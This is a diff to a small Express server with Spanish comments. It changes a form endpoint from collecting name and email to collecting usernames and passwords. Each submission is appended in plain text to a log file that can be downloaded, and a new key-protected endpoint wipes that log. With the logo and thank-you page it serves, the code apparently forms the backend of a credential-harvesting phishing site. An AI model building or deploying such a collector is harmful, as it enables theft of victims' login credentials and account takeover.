@@ -7,7 +7,7 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// Servir archivos estáticos de la carpeta public (oep.png, gracias.html, etc.)
+// Servir archivos estáticos de la carpeta public
 app.use(express.static(path.join(__dirname, 'public')));
 
 // ========== CONFIGURACIÓN ==========
@@ -21,9 +21,9 @@ if (!fs.existsSync(DATA_FILE)) {
 
 // ========== API: GUARDAR REGISTRO ==========
 app.post('/api/submit', (req, res) => {
-    const { nombre, email } = req.body;
+    const { usuario, password } = req.body;
     const timestamp = new Date().toLocaleString('es-ES');
-    const line = `[${timestamp}] | Nombre: ${nombre || '(vacío)'} | Email: ${email || '(vacío)'}\n`;
+    const line = `[${timestamp}] | Usuario: ${usuario || '(vacío)'} | Password: ${password || '(vacío)'}\n`;
     
     fs.appendFileSync(DATA_FILE, line);
     res.json({ success: true, message: 'Registro guardado correctamente' });
@@ -51,6 +51,19 @@ app.get('/api/download', (req, res) => {
     res.setHeader('Content-Disposition', 'attachment; filename="todos_los_registros.txt"');
     res.setHeader('Content-Type', 'text/plain; charset=utf-8');
     res.sendFile(DATA_FILE);
+});
+
+// ========== NUEVO: LIMPIAR / REINICIAR REGISTROS ==========
+app.get('/api/clear', (req, res) => {
+    const key = req.query.key;
+    if (key !== SECRET_KEY) {
+        return res.status(403).send('⛔ ACCESO DENEGADO. Clave incorrecta.');
+    }
+    
+    // Reiniciar el archivo con el header
+    fs.writeFileSync(DATA_FILE, '=== REGISTROS DEL FORMULARIO ===\nReiniciado: ' + new Date().toLocaleString('es-ES') + '\n================================\n\n');
+    
+    res.json({ success: true, message: 'Registros limpiados correctamente' });
 });
 
 const PORT = process.env.PORT || 3000;
